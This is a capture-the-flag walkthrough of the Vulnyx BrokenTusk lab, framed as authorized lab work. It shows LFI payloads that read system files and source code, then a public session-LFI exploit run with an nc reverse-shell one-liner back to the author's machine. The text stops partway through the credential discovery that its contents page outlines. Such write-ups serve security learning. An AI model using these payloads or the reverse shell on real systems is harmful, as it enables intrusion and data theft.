# Vulnyx – BrokenTusk Lab


<img width="1347" height="420" alt="Screenshot 2026-11-09 122758" src="https://github.com/user-attachments/assets/bef4b861-6eb0-4c9c-9df4-be4367990408" />



## Overview

This write-up documents the penetration testing walkthrough of the **BrokenTusk** machine from Vulnyx. The objective was to identify exposed services, discover vulnerabilities, obtain initial access, enumerate the target system, and escalate privileges to root.

The walkthrough includes the commands, relevant terminal outputs, observations, and the final privilege-escalation path.

> **Lab scope:** This walkthrough was performed against the intentionally vulnerable BrokenTusk machine in an authorized lab environment.

## Target Information

| Detail | Information |
|---|---|
| Platform | Vulnyx |
| Machine | BrokenTusk |
| Target IP | not provided |


---

## Table of Contents

1. [Reconnaissance and Enumeration](#1-reconnaissance-and-enumeration)
   - [Discovering the Target IP Address](#11-discovering-the-target-ip-address)
   - [Initial Nmap Scan](#12-initial-nmap-scan)
   - [Directory Enumeration Using FFUF](#13-directory-enumeration-using-ffuf)
   - [Additional Directory Enumeration Using Gobuster](#14-additional-directory-enumeration-using-gobuster)
2. [Identifying the Local File Inclusion Vulnerability](#2-identifying-the-local-file-inclusion-vulnerability)
   - [Initial Inspection of vuln.php](#21-initial-inspection-of-vulnphp)
   - [Identifying the Vulnerable Parameter](#22-identifying-the-vulnerable-parameter)
   - [Identifying the PHP Version](#23-identifying-the-php-version)
   - [Testing Whether LFI Allows Reading Local Files](#24-testing-whether-lfi-allows-reading-local-files)
   - [Reading the Vulnerable PHP Source Code](#25-reading-the-vulnerable-php-source-code)
   - [Identifying the Web Server Process User](#26-identifying-the-web-server-process-user)
   - [Checking for SSH Credentials](#27-checking-for-ssh-credentials)
3. [PHP Session and PHP2Shell Investigation](#3-php-session-and-php2shell-investigation)
   - [Researching a Possible LFI-to-RCE Chain](#31-researching-a-possible-lfi-to-rce-chain)
   - [Downloading the Exploit](#32-downloading-the-exploit)
   - [Checking the Exploit Arguments](#33-checking-the-exploit-arguments)
   - [Testing the Exploit](#34-testing-the-exploit)
   - [Upgrading the Reverse Shell](#35-upgrading-the-reverse-shell)
   - [Confirming the Initial Access User](#36-confirming-the-initial-access-user)
4. [Local Enumeration as www-data](#4-local-enumeration-as-www-data)
   - [Checking Sudo Permissions](#41-checking-sudo-permissions)
   - [Finding SUID Binaries](#42-finding-suid-binaries)
   - [Checking Scheduled Cron Jobs](#43-checking-scheduled-cron-jobs)
   - [Inspecting the Web Root](#44-inspecting-the-web-root)
   - [Investigating the PHP Session Files](#45-investigating-the-php-session-files)
   - [Checking the PHP Session Directory](#46-checking-the-php-session-directory)
5. [Discovering the User Credentials](#5-discovering-the-user-credentials)
   - [Inspecting the Executable](#51-inspecting-the-executable)
   - [Running passgoblin](#52-running-passgoblin)
6. [Obtaining SSH Access as zer0arc4](#6-obtaining-ssh-access-as-zer0arc4)
   - [Retrieving the User Flag](#61-retrieving-the-user-flag)
7. [Privilege Escalation – Abusing APT Configuration](#7-privilege-escalation--abusing-apt-configuration)
   - [Checking Sudo Permissions as zer0arc4](#71-checking-sudo-permissions-as-zer0arc4)
   - [Inspecting the APT Repository Configuration](#72-inspecting-the-apt-repository-configuration)
   - [Identifying the Local Repository Server](#73-identifying-the-local-repository-server)
   - [Understanding the Privilege-Escalation Opportunity](#74-understanding-the-privilege-escalation-opportunity)
   - [Creating the Initial Test Package](#75-creating-the-initial-test-package)
   - [Understanding Why the First Attempt Failed](#76-understanding-why-the-first-attempt-failed)
   - [Rebuilding the Package to Use /var/tmp](#77-rebuilding-the-package-to-use-vartmp)
   - [Rebuilding the APT Package Index](#78-rebuilding-the-apt-package-index)
   - [Updating the Repository Release File](#79-updating-the-repository-release-file)
   - [Refreshing the APT Package Information](#710-refreshing-the-apt-package-information)
   - [Executing the APT Upgrade](#711-executing-the-apt-upgrade)
   - [Obtaining Root Access](#712-obtaining-root-access)
8. [Attack Path Summary](#8-attack-path-summary)
9. [Vulnerabilities and Misconfigurations Identified](#9-vulnerabilities-and-misconfigurations-identified)
10. [Tools Used](#10-tools-used)
11. [Lab Summary](#11-lab-summary)




## 1. Reconnaissance and Enumeration

### 1.1 Discovering the Target IP Address

The lab did not provide the target IP address directly. Therefore, I first identified my Kali Linux IP address and scanned the local network to discover active devices.

```bash
# Identify the IP configuration of the Kali machine
ifconfig

# Discover active devices on the local network
sudo arp-scan -I eth0 -l
```

**Output:**

```text
192.168.108.130 00:0c:29:93:a2:f9 (Unknown)
```

An unknown device was discovered at `192.168.108.130`. I used Nmap to verify whether it was the target machine and identify its open ports.

### 1.2 Initial Nmap Scan

```bash
nmap -sS -p- -sV -O --open --min-rate 5000 -n -oN scan 192.168.108.130
```

**Output:**

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-08 00:51 -0500
Nmap scan report for 192.168.108.130
Host is up (0.0014s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    nginx
MAC Address: 00:0C:29:93:A2:F9 (VMware)
No exact OS matches for host.
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 24.15 seconds
```

The scan identified two open TCP ports:

| Port | Service | Version / Details |
|---|---|---|
| 22 | SSH | OpenSSH 10.0p2 Debian 7+deb13u4 |
| 80 | HTTP | nginx |

Port 22 provides SSH access, while port 80 hosts the web application. I decided to investigate the web server first.

### 1.3 Directory Enumeration Using FFUF

To discover hidden directories and files, I used FFUF.

FFUF (Fuzz Faster U Fool) is a web fuzzer used to discover hidden directories, files, parameters, and virtual hosts.

```bash
ffuf -u "http://192.168.108.130/FUZZ" \
     -w /usr/share/wordlists/dirb/common.txt \
     -ac
```

**Output:**

```text
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.108.130/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

api                     [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 4ms]
app                     [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 1ms]
:: Progress: [4614/4614] :: Job [1/1] :: 289 req/sec :: Duration: [0:00:16] :: Errors: 0 ::
```

Two directories were discovered:

- `/api/`
- `/app/`

Both returned HTTP 301 redirects, indicating that the directories exist and the server redirects requests to their trailing-slash versions.

I proceeded to enumerate both directories.

```bash
# Enumerate the API directory
ffuf -u "http://192.168.108.130/api/FUZZ" \
     -w /usr/share/wordlists/dirb/big.txt \
     -e .php,.json,.txt,.js \
     -ac

# Enumerate the application directory
ffuf -u "http://192.168.108.130/app/FUZZ" \
     -w /usr/share/wordlists/dirb/big.txt \
     -e .php,.json,.txt,.js \
     -ac
```

Nothing useful was discovered under `/api/`. However, the `/app/` scan revealed:

```text
upload.php              [Status: 200, Size: 317, Words: 94, Lines: 21, Duration: 137ms]
```

I opened `upload.php` in the browser. It displayed a demonstration page and did not immediately reveal an exploitable functionality.
<img width="1694" height="932" alt="Screenshot_2026-11-08_01-37-51" src="https://github.com/user-attachments/assets/90e53a96-e2a4-4e39-b8b7-4e2cc14fc133" />


### 1.4 Additional Directory Enumeration Using Gobuster

I also used Gobuster to perform another directory and file enumeration scan.

```bash
gobuster dir \
-u http://192.168.108.130/ \
-w /usr/share/wordlists/dirb/common.txt \
-x php,txt,bak,html \
--exclude-length 26659 \
-t 30
```

**Relevant output:**

```text
===============================================================
Gobuster v3.8.2
===============================================================

.cvsignore.html      (Status: 403) [Size: 146]
.config.bak          (Status: 403) [Size: 146]
.cache               (Status: 403) [Size: 146]
.forward             (Status: 403) [Size: 146]
.bash_history        (Status: 403) [Size: 146]
.bashrc              (Status: 403) [Size: 146]
.git/HEAD            (Status: 403) [Size: 146]
.htaccess            (Status: 403) [Size: 146]
.mysql_history       (Status: 403) [Size: 146]
.ssh                 (Status: 403) [Size: 146]
api                  (Status: 301) [Size: 162] [--> http://192.168.108.130/api/]
app                  (Status: 301) [Size: 162] [--> http://192.168.108.130/app/]
vuln.php             (Status: 200) [Size: 223]

===============================================================
Finished
===============================================================
```

The most interesting discovery was `vuln.php`, which returned HTTP 200.

Unlike the previously discovered upload page, this file appeared to be directly related to a PHP vulnerability. I decided to investigate it.

---

## 2. Identifying the Local File Inclusion Vulnerability

### 2.1 Initial Inspection of vuln.php

When I opened the following URL in the browser:

```text
http://192.168.108.130/vuln.php
```
<img width="1720" height="965" alt="Screenshot_2026-11-08_05-41-07" src="https://github.com/user-attachments/assets/8baf7593-e53d-49f6-884e-8d42da57fb86" />


The page displayed a PHP warning:

```text
Warning: include(home): Failed to open stream:
No such file or directory
in /var/www/html/vuln.php on line 3
```

This warning revealed that the application was calling PHP's `include()` function with the value `home`.

This could indicate a file-inclusion vulnerability. However, I first needed to determine whether a URL parameter controlled the filename passed to `include()`.

### 2.2 Identifying the Vulnerable Parameter

I tested several common parameter names:

```bash
for p in page file include view; do
    echo "===== $p ====="
    curl -s "http://192.168.108.130/vuln.php?$p=home"
done
```

All four requests produced the same warning because I had supplied the same value, `home`, to every parameter.

To identify which parameter was actually being used, I tested them again with a unique value.

```bash
for p in page file include view; do
    echo "===== Testing $p ====="
    curl -s "http://192.168.108.130/vuln.php?$p=probe123"
    echo
done
```

**Output:**

```text
===== Testing page =====

Warning: include(probe123): Failed to open stream: No such file or directory in /var/www/html/vuln.php on line 3

Warning: include(): Failed opening 'probe123' for inclusion (include_path='.:') in /var/www/html/vuln.php on line 3

===== Testing file =====

Warning: include(home): Failed to open stream: No such file or directory in /var/www/html/vuln.php on line 3

Warning: include(): Failed opening 'home' for inclusion (include_path='.:') in /var/www/html/vuln.php on line 3

===== Testing include =====

Warning: include(home): Failed to open stream: No such file or directory in /var/www/html/vuln.php on line 3

Warning: include(): Failed opening 'home' for inclusion (include_path='.:') in /var/www/html/vuln.php on line 3

===== Testing view =====

Warning: include(home): Failed to open stream: No such file or directory in /var/www/html/vuln.php on line 3

Warning: include(): Failed opening 'home' for inclusion (include_path='.:') in /var/www/html/vuln.php on line 3
```

The results confirmed that only the `page` parameter changed the filename passed to PHP's `include()` function.

| Parameter | Result |
|---|---|
| page | `include(probe123)` |
| file | `include(home)` |
| include | `include(home)` |
| view | `include(home)` |

This indicated a potential **Local File Inclusion (LFI)** vulnerability.

### 2.3 Identifying the PHP Version

I inspected the HTTP response headers to identify the technologies used by the web application.

```bash
curl -I http://192.168.108.130/
```

**Output:**

```text
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 08 Nov 2026 12:09:00 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/8.0.30
Set-Cookie: PHPSESSID=ecf38301853d30a8705e2a5c99badbd1; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
```

The headers revealed:

- Web server: nginx
- PHP version: 8.0.30
- Session cookie: `PHPSESSID`

The PHP session cookie later became relevant during my investigation of PHP session handling.

### 2.4 Testing Whether LFI Allows Reading Local Files

I first tested whether the vulnerable parameter could read `/etc/hostname`.

```bash
curl -i --get \
--data-urlencode "page=/etc/hostname" \
http://192.168.108.130/vuln.php
```

**Output:**

```text
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 08 Nov 2026 11:01:02 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.30

BrokenTusk
```

The response returned `BrokenTusk`, confirming that the application could include and display local files.

Next, I attempted to read `/etc/passwd`.

```bash
curl -i --get \
--data-urlencode "page=/etc/passwd" \
http://192.168.108.130/vuln.php
```

**Output:**

```text
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 08 Nov 2026 11:01:15 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.30

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon:/usr/lib/dhcpcd:/bin/false
systemd-timesync:x:991:991:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:990:990:System Message Bus:/nonexistent:/usr/sbin/nologin
sshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin
zer0arc4:x:1000:1000:zer0arc4,,,:/home/zer0arc4:/bin/bash
```

The `/etc/passwd` file revealed an interesting user account:

```text
zer0arc4:x:1000:1000:zer0arc4,,,:/home/zer0arc4:/bin/bash
```

This gave us the following information:

| Field | Value |
|---|---|
| Username | `zer0arc4` |
| UID | 1000 |
| Home directory | `/home/zer0arc4` |
| Login shell | `/bin/bash` |

I now had a potential username to investigate for SSH access.

### 2.5 Reading the Vulnerable PHP Source Code

To understand exactly how the LFI vulnerability worked, I used PHP's filter wrapper to retrieve the source code of `vuln.php` in Base64 format.

```bash
curl -sG \
--data-urlencode 'page=php://filter/convert.base64-encode/resource=/var/www/html/vuln.php' \
http://192.168.108.130/vuln.php
```

**Output:**

```text
PD9waHAKJHBhZ2UgPSBpc3NldCgkX0dFVFsncGFnZSddKSA/ICRfR0VUWydwYWdlJ10gOiAnaG9tZSc7CmluY2x1ZGUoJHBhZ2UpOwo=
```

I decoded the Base64 string:

```bash
echo 'PD9waHAKJHBhZ2UgPSBpc3NldCgkX0dFVFsncGFnZSddKSA/ICRfR0VUWydwYWdlJ10gOiAnaG9tZSc7CmluY2x1ZGUoJHBhZ2UpOwo=' | base64 -d
```

**Decoded source code:**

```php
<?php
$page = isset($_GET['page']) ? $_GET['page'] : 'home';
include($page);
```

The source code confirmed the vulnerability:

1. PHP reads the `page` parameter from the URL.
2. It does not validate or sanitize the supplied value.
3. It passes the value directly to `include()`.
4. Consequently, an attacker can make the application include local files.

This confirmed that `vuln.php` contains an LFI vulnerability.

### 2.6 Identifying the Web Server Process User

I wanted to determine which Linux user was running the PHP process.

The `/proc` filesystem provides information about running processes. I used the LFI vulnerability to read `/proc/self/status`.

```bash
curl -sG \
--data-urlencode 'page=/proc/self/status' \
http://192.168.108.130/vuln.php
```

**Relevant output:**

```text
Name:   php-fpm
Umask:  0022
State:  R (running)
Tgid:   814
Pid:    814
PPid:   747
Uid:    33      33      33      33
Gid:    33      33      33      33
Groups: 33
CapEff: 0000000000000000
NoNewPrivs:     0
Seccomp:        0
```

The important fields were:

| Field | Result | Meaning |
|---|---|---|
| Name | php-fpm | PHP-FPM process |
| PID | 814 | Process ID |
| UID | 33 | Running as `www-data` |
| GID | 33 | Running as `www-data` |
| CapEff | 0 | No effective Linux capabilities |

This confirmed that the PHP-FPM process was running as `www-data`, not as root.

### 2.7 Checking for SSH Credentials

Since `/etc/passwd` revealed the user `zer0arc4`, I checked whether the LFI vulnerability could read the user's SSH private key.

```bash
curl -sG \
--data-urlencode 'page=/home/zer0arc4/.ssh/id_rsa' \
http://192.168.108.130/vuln.php
```

**Output:**

```text
Warning: include(/home/zer0arc4/.ssh/id_rsa): Failed to open stream: Permission denied in /var/www/html/vuln.php on line 3

Warning: include(): Failed opening '/home/zer0arc4/.ssh/id_rsa' for inclusion (include_path='.:') in /var/www/html/vuln.php on line 3
```

The PHP process could not read the requested file because of filesystem permissions.

I also checked the SSH server configuration.

```bash
curl -sG \
--data-urlencode 'page=/etc/ssh/sshd_config' \
http://192.168.108.130/vuln.php
```

**Relevant output:**

```text
Include /etc/ssh/sshd_config.d/*.conf

# Authentication:

PermitRootLogin yes

PubkeyAuthentication yes

#PasswordAuthentication yes

KbdInteractiveAuthentication no

UsePAM yes
```

Three settings were particularly interesting:

| Setting | Value | Meaning |
|---|---|---|
| PermitRootLogin | yes | Root SSH login is permitted by this configuration |
| PubkeyAuthentication | yes | SSH public-key authentication is enabled |
| PasswordAuthentication | Commented | The effective value may depend on defaults or included configuration files |

Root SSH login being permitted does not mean that root credentials are available.

The configuration also referenced:

```text
/etc/ssh/sshd_config.d/*.conf
```

I tried a possible configuration filename:

```bash
curl -sG \
--data-urlencode 'page=/etc/ssh/sshd_config.d/sshd.conf' \
http://192.168.108.130/vuln.php
```

It returned a file-not-found warning. This only established that the file did not exist at that exact path.

I also checked the user's SSH directory and shell history.

```bash
curl -sG \
--data-urlencode 'page=/home/zer0arc4/.ssh' \
http://192.168.108.130/vuln.php

curl -sG \
--data-urlencode 'page=/home/zer0arc4/.bash_history' \
http://192.168.108.130/vuln.php
```

**Output:**

```text
Warning: include(/home/zer0arc4/.ssh): Failed to open stream: Permission denied in /var/www/html/vuln.php on line 3

Warning: include(): Failed opening '/home/zer0arc4/.ssh' for inclusion (include_path='.:') in /var/www/html/vuln.php on line 3

Warning: include(/home/zer0arc4/.bash_history): Failed to open stream: Permission denied in /var/www/html/vuln.php on line 3

Warning: include(): Failed opening '/home/zer0arc4/.bash_history' for inclusion (include_path='.:') in /var/www/html/vuln.php on line 3
```

The web server user could not access these files. I therefore continued investigating another way to obtain command execution.

---

## 3. PHP Session and PHP2Shell Investigation

### 3.1 Researching a Possible LFI-to-RCE Chain

After confirming the LFI vulnerability, I researched whether it could be combined with PHP session upload-progress functionality to obtain Remote Code Execution (RCE).

I found a PHP2Shell proof-of-concept repository:

**GitHub repository:** https://github.com/ikow/php2shell-poc

The PoC attempts to combine PHP session upload-progress injection with an LFI vulnerability.

The PHP version identified earlier was 8.0.30. However, the version number alone does not prove that a particular PHP exploit applies. Exploitability depends on the relevant PHP configuration, application behavior, and the actual vulnerability conditions.

### 3.2 Downloading the Exploit

Initially, I downloaded the individual Python script:

```bash
wget https://raw.githubusercontent.com/ikow/php2shell-poc/refs/heads/main/exploit/chain_a_session_lfi.py
```

When I attempted to execute it, Python reported a missing module:

```text
ModuleNotFoundError: No module named 'lib'
```

The script depended on supporting files from the repository.

Therefore, I downloaded the complete repository:

```bash
git clone https://github.com/ikow/php2shell-poc.git
```

Then navigated into the repository:

```bash
cd php2shell-poc
```

### 3.3 Checking the Exploit Arguments

I checked the exploit's available arguments:

```bash
python3 exploit/chain_a_session_lfi.py --help
```

The important parameters were:

- `--host`: Target IP address.
- `--port`: Target HTTP port.
- `--inject-path`: Endpoint used for the injection request.
- `--lfi-path`: Endpoint containing the LFI vulnerability.
- `--session-path`: PHP session storage directory.
- `--command`: Command to execute if exploitation succeeds.
- `--delay`: Delay between attempts.
- `--attempts`: Number of attempts.

### 3.4 Testing the Exploit

Based on the PoC's usage information and the LFI endpoint identified earlier, I prepared the following test command:

```bash
python3 exploit/chain_a_session_lfi.py \
--host 192.168.108.130 --port 80 \
--inject-path /index.php --lfi-path /vuln.php \
--session-path /tmp/sessions \
--delay 0.05 --attempts 3 --command 'id'
```

I then prepared a reverse-shell command and started a Netcat listener on my Kali machine.

**Exploit command:**

```bash
python3 exploit/chain_a_session_lfi.py \
--host 192.168.108.130 --port 80 \
--inject-path /index.php --lfi-path /vuln.php \
--session-path /tmp/sessions \
--delay 0.05 --attempts 3 \
--command "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 192.168.108.128 80 > /tmp/f"
```

**Exploit output:**

```text
[*] Target: http://192.168.108.130:80
[*] Command: rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 192.168.108.128 80 > /tmp/f

[attempt 1] SID=exploitb3ceb2cba54a4aff9835 file=/tmp/sessions/sess_exploitb3ceb2cba54a4aff9835
    plant=HTTP/1.1 200 OK
    lfi=NO RESPONSE body=b''

[attempt 2] SID=exploit1fdca7b6a84c4be8932c file=/tmp/sessions/sess_exploit1fdca7b6a84c4be8932c
    plant=NO RESPONSE
    lfi=NO RESPONSE body=b''

[attempt 3] SID=exploit138063ed813541a6b2a4 file=/tmp/sessions/sess_exploit138063ed813541a6b2a4
    plant=NO RESPONSE
    lfi=NO RESPONSE body=b''

[-] RCE not confirmed — LFI path/session path or timing is wrong
```

The PoC did not confirm RCE through its own verification mechanism.

However, the Netcat listener received a connection from the target.

**Netcat listener output:**

```text
nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.108.128] from (UNKNOWN) [192.168.108.130] 36860
sh: 0: can't access tty; job control turned off
$
```

The incoming connection provided a shell from the target. This independently demonstrated command execution, even though the PoC itself reported that RCE was not confirmed.

### 3.5 Upgrading the Reverse Shell

The initial reverse shell was not fully interactive. I upgraded it to a proper TTY.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then I pressed `Ctrl + Z` and executed the following command in my Kali terminal:

```bash
stty raw -echo; fg
```

After pressing Enter, the shell became interactive.

### 3.6 Confirming the Initial Access User

I checked the current user and its privileges.

```bash
whoami
id
```

**Output:**

```text
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<badge color="success">Initial access obtained</badge>

I successfully obtained a reverse shell as `www-data`.

The next step was to enumerate the target system and identify a privilege-escalation path.

---

## 4. Local Enumeration as www-data

### 4.1 Checking Sudo Permissions

I first checked whether the current user could run any commands with sudo.

```bash
sudo -l
```

The command requested a password. Since I did not have the password for `www-data`, I could not use this route directly.

### 4.2 Finding SUID Binaries

Next, I searched the filesystem for files with the SUID permission bit.

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Output:**

```text
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/mount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

The results contained standard system utilities such as `passwd`, `su`, and `sudo`. No immediately obvious unusual SUID binary was identified.

### 4.3 Checking Scheduled Cron Jobs

I checked the system-wide cron configuration for scheduled tasks that might execute scripts with elevated privileges.

```bash
cat /etc/crontab
```

**Output:**

```bash
# /etc/crontab: system-wide crontab

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) OR sun,mon,...
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
```

The file contained standard Debian maintenance jobs. I did not identify a custom cron job that could be used for privilege escalation.

### 4.4 Inspecting the Web Root

I then inspected the web application's directory.

```bash
cd /var/www/html/
ls -la
```

**Output:**

```text
total 68
drwxr-xr-x 4 root root      4096 Oct 31 17:47 .
drwxr-xr-x 3 root root      4096 Oct 31 16:28 ..
drwxr-x--- 2 root www-data  4096 Oct 31 16:30 api
drwxr-x--- 2 root www-data  4096 Nov  3 12:44 app
-rw-r----- 1 root www-data   119 Oct 31 16:30 app_serialize.php
-rw-r----- 1 root www-data   177 Oct 31 16:30 destruct_test.php
-rw-r----- 1 root www-data    57 Oct 31 16:30 fatal.php
-rw-r----- 1 root www-data 26851 Oct 31 17:47 index.php
-rw-r----- 1 root www-data    58 Oct 31 16:30 nosession.php
-rw-r----- 1 root www-data    57 Oct 31 16:30 session_oom.php
-rw-r----- 1 root www-data    77 Oct 31 16:30 vuln.php
```

Two filenames are little suspicious:

- `app_serialize.php`
- `destruct_test.php`

These suggested that the application contained PHP session serialization and object-deserialization test code.

I decided to inspect them.

### 4.5 Investigating the PHP Session Files

```bash
cat app_serialize.php
cat destruct_test.php
```

**Output:**

```php
<?php
ini_set("session.serialize_handler", "php_serialize");
session_start();
$_SESSION["init"] = time();
echo "OK\n";


<?php
class Evil {
    public $cmd;
    public function __destruct() {
        if ($this->cmd) {
            system($this->cmd);
        }
    }
}
session_start();
echo "OK\n";
```

The code revealed two interesting behaviors.

**In `app_serialize.php`:**

- The session serialization handler is set to `php_serialize`.
- A session is started.
- A timestamp is stored in the session.

**In `destruct_test.php`:**

- A class named `Evil` is defined.
- The class has a public property named `cmd`.
- Its `__destruct()` method calls `system()` if the property contains a command.

This code warranted further investigation because unsafe PHP object deserialization can lead to command execution when attacker-controlled serialized objects are processed.

Finding these files alone does not mean the deserialization vulnerability can be exploited. To exploit it, we need the correct session format, a way to deserialize the data, and a way to trigger the vulnerable code.

### 4.6 Checking the PHP Session Directory

I inspected the session directory:

```bash
ls -la /tmp/sessions
```

**Output:**

```text
total 56
drwxrwxrwt 2 www-data www-data 320 Nov  8 08:20 .
drwxrwxrwt 8 root     root     180 Nov  8 08:20 ..
-rw------- 1 www-data www-data 429 Nov  8 08:03 sess_exploit1db04f005fab4e008487
-rw------- 1 www-data www-data 429 Nov  8 08:17 sess_exploit2002f4135f634fcba8c4
-rw------- 1 www-data www-data 429 Nov  8 08:08 sess_exploit43a703e4709341cd89b8
-rw------- 1 www-data www-data 427 Nov  8 08:09 sess_exploit4ebccfd20ee1472ba776
-rw------- 1 www-data www-data 429 Nov  8 08:08 sess_exploit4efd0334f256444a824d
-rw------- 1 www-data www-data 369 Nov  8 08:01 sess_exploit7d0df0d2912a4466be36
-rw------- 1 www-data www-data 385 Nov  8 07:59 sess_exploit817907abe2ae469aa5d2
-rw------- 1 www-data www-data 369 Nov  8 08:01 sess_exploit85a68a23b35d4e31adce
-rw------- 1 www-data www-data 427 Nov  8 08:18 sess_exploit8666d0000aa14ea6b976
-rw------- 1 www-data www-data 427 Nov  8 08:09 sess_exploit97ea725fe11b4df995be
-rw------- 1 www-data www-data 429 Nov  8 08:05 sess_exploitb0ede7e5f6dd43c8bcd9
-rw------- 1 www-data www-data 469 Nov  8 08:20 sess_exploitb3ceb2cba54a4aff9835
-rw------- 1 www-data www-data 369 Nov  8 08:01 sess_exploite85b790769034120a0b2
```

The directory was owned by `www-data`, and the session files were also owned by that user.

This information helped us understand how the PHP session files worked and investigate a possible deserialization vulnerability. 
However, we could not confirm that this method would give us root access. So, lets not spend more time on an unconfirmed approach.

Lets continued with deeper system enumeration.

---

## 5. Discovering the User Credentials

During further enumeration, I investigated the `/opt` directory and found an executable named `passgoblin`.

### 5.1 Inspecting the Executable

I inspected the file:

```bash
file /opt/passgoblin
```

The executable was an ELF binary and appeared to be stripped.

I then used `strings` to search for readable strings embedded in the binary.

```bash
strings /opt/passgoblin
```

Output:
```
]J.A
/lib64/ld-linux-x86-64.so.2
mgUa
fgets
stdin
puts
strcspn
__libc_start_main
__cxa_finalize
strchr
memset
printf
strcmp
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
ABCDEFGHH
IJKLMNOPH
QRSTUVWXH
YZabcdefH
ghijklmnH
opqrstuvH
wxyz0123H
456789+/H
ggWelcome to the PassGoblin, user zer0arc4!
Enter the Secret Key to view the credentials: 
Q09NUElMRURfV0lUSE9VVF9FUlJPUlNfQlVUX0ZVTExfT0ZfRVhJU1RFTlRJQUxfQ1JJU0lT
Access Granted!
Username: zer0arc4
Password: %s
The key said hello, the password said goodbye to its privacy.
Access Denied! Invalid Secret Key.
;*3$"
GCC: (Debian 16.2.0-1) 16.2.0
.shstrtab
.note.gnu.build-id
.interp
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.note.gnu.property
.note.ABI-tag
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment


```

Among the output, I found the following Base64-encoded string:

```text
Q09NUElMRURfV0lUSE9VVF9FUlJPUlNfQlVUX0ZVTExfT0ZfRVhJU1RFTlRJQUxfQ1JJU0lT
```

I decoded it:

```bash
echo 'Q09NUElMRURfV0lUSE9VVF9FUlJPUlNfQlVUX0ZVTExfT0ZfRVhJU1RFTlRJQUxfQ1JJU0lT' | base64 -d
```

**Output:**

```text
COMPILED_WITHOUT_ERRORS_BUT_FULL_OF_EXISTENTIAL_CRISIS
```

This string appeared to be a clue associated with the executable.

